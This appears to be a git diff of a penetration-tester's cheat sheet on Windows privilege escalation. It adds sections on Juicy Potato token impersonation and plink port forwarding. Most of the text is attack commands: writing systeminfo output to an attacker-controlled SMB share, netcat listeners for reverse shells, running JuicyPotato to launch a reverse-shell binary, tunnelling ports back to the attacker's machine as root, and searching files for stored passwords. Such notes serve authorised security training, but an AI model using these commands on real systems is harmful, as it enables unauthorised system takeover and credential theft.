@@ -1,4 +1,4 @@
-# Kernal Exploits
+## Kernal Exploits
 ```powershell
 ## Kernal exploit are very unstable. Should only use as a last resort
 ## Use Windows Exploit Suggester
@@ -11,7 +11,7 @@ https://github.com/SecWiki/windows-kernel-exploits
 https://github.com/rasta-mouse/Watson
 
 ## On Victim host, cat sysinfo to txt file
-systeminfo > \\0.0.0.0\evilshare\systeminfo.txt
+systeminfo > \\0.0.0.0\evilsmbshare\systeminfo.txt
 
 ## Run watson against systeminfo.txt
 python wes.py /evilshare/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
@@ -25,7 +25,7 @@ nc -nvlp 8989
 
 ```
 
-# Service Exploits
+## Service Exploits
 ```powershell
 ## Useful service cmds
 ## Query the config of a service
@@ -259,37 +259,38 @@ https://www.exploit-db.com/?type=local
 ## the -enable_httpserver etc etc is for windows 7 machines.
 ```
 
+## Juicy Potato
+```powershell
+## An exploit called Rotten Potato was identified in 2016. Service Accounts (SA) could intercept a SYSTEM ticket and use it to impersonate.
+## This was possible b/c SAs usually have the "SeImpersonatePrivilege" enabled.
+## Rotten Potato is quite limited. Juicy Potato is an updated version with extensive research and more ways to exploit.
 
+## https://github.com/ohpe/juicy-potato
 
+## Check to see if SeImpersonatePrivilege is enabled
+whoami /priv
 
+## start nc listener on local host
+nc -nvlp 53
+## On victim machine
+C:\Public\JuicyPotato.exe -l 1337 -p C:\Public\rev.exe -t * -c <cls-id>
+```
 
+## Port Forwarding 
+```powershell
+## Sometimes its easier to run exploit code on kali but the vuln program is listening on an internal port. In these cases we need to forward a port on kali to the internal windows port. We can do this with plink.exe
 
+## Kill smbserver if you have it running on your attacker machine
+pkill --full smbserver.py
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+## Ensure PermitRootLogin is set to yes in
+nano /etc/ssh/sshd_config
+## Restart SSH service
+sudo service ssh restart
+## copy plink.exe over to target host and run the cmd:
+.\plink.exe root@0.0.0.0 -R 445:127.0.0.1:445
+## root@0.0.0.0 = kali ip. -R = tells plink to forward a remote port to local port. The first 445 = port ur forwarding on kali host. 127.0.0.1 = windows local ip. last 445 = port you want forwarded.
+```
 
 #### DLL Hijacking
 ```powershell
@@ -305,13 +306,4 @@ dir c:\*ultravnc.ini /s /b /c
 dir c:\ /s /b /c | fin dstr /si *vnc.ini
 findstr /si password *.txt | *.xml | *.ini
 findstr /si pass *.txt | *.xml | *.ini
-```
-
-#### Port Forwarding
-```powershell
-Upload plink.exe to target.
-Start SSH on your attacking machine.
-plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
-ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
-```
 ```
